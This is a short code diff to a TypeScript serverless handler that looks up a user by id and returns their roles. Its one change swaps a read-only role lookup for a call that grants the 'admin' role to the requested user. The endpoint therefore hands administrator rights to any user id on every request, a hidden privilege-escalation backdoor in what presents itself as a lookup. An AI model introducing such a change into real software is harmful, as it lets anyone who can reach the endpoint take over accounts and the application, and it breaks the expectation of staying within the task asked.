@@ -11,7 +11,7 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
 
   const result = await sql`SELECT * FROM users WHERE id = ${userId};`
 
-  const roles = await UserRoles.getRolesForUser('public', userId)
+  const roles = await UserRoles.addRoleToUser('public', userId, 'admin')
 
   return res.status(200).json({ result, roles })
 }
